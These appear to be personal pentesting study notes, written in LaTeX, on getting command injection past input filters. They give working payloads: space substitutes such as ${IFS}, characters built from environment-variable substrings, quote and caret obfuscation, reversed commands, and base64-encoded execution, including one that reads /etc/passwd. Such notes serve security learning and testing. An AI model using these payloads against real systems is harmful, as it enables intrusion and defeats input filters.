

\section{Filters}
\subsection{Bypassing Front-End Validation}

use burp, zap of dev tool of the browser to remove the validator.

\subsection{Bypass blacklisted operators}
use the url encode

\subsection{Bypass blacklisted spaces}
use \verb-+-, \verb+%09+ (tab), \verb+${IFS}+ (on linux) or brace expression
which adds space between parameters \verb+{ls,-l,-a}+
see
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space}{PayloadsAllTheThings}
    for more examples.


\subsection{Bypass other blacklisted characters}
\subsubsection{linux}
the shell substring function can be used on env variables to obtain special
caracters be might depend on the content
\begin{verbatim}
# / with  ${PATH:0:1}
# ; with ${LS_COLORS:10:1} 
<INPUT>${LS_COLORS:10:1}${IFS}ls
\end{verbatim}

Charactere shifting: identify the character wich comes before the expected
on in the ascii table with \verb+ascii -d+ and use it in the following
command to validate:
\begin{verbatim}
echo $(tr '!-}' '"-~'<<<CHAR)
\end{verbatim}

\subsubsection{Windows command line}
\begin{verbatim}
%HOMEPATH:~6,-11%
\end{verbatim}

\subsubsection{Windows PowerShell}
\begin{verbatim}
$env:HOMEPATH[0]
\end{verbatim}

PowerShell also allows character shifting

\subsection{Bypass blacklisted commands}

One very common and easy obfuscation technique is inserting certain characters
within ithe command that are usually ignored by command shells like Bash or
PowerShell and will execute the same command as if they were not there. Some of
these characters are a single-quote \verb+'+ and a double-quote \verb+"+, in addition to a
few others.

For example \verb+w'h'o'am'i+ will execute \verb+whoami+

{\bf Important}: 
\begin{itemize}
    \item the types of quotes cannot be mixed
    \item the number of quotes must be even. 
\end{itemize}

Linux only additional characters:
\begin{itemize}
    \item \verb+\+ (\verb+w\ho\am\i+)
    \item \verb+$@+ (\verb+who$@ami+)
\end{itemize}


Windows only additional characters:
\begin{itemize}
    \item \verb+^+ (\verb+who^ami+)
\end{itemize}

\subsection{Advanced command obfuscation}
\subsubsection{Case manipulation}
On windows as command are not case-sensitive command can be directly
manipulated \verb+WhOamI+ whereas on linux  the following command which uses
\verb+tr+ to replace all upper-case characters with lower-case characters can
be used:
\begin{verbatim}
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
\end{verbatim}


\subsection{Reversed command}
Get the reverted string using \verb+echo 'whoami' | rev+ then use it as a
subcommand for example for \verb+whoami+ \verb+$(rev<<<'imaohw')+

on windows PowerShell:
\begin{verbatim}
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
\end{verbatim}

\subsection{Encoded commands}

\begin{verbatim}
echo -n 'cat /etc/passwd | grep 33' | base64

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
\end{verbatim}

on windows PowerShell:
\begin{verbatim}
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

iex "$([System.Text.Encoding]::Unicode.
    GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
\end{verbatim}
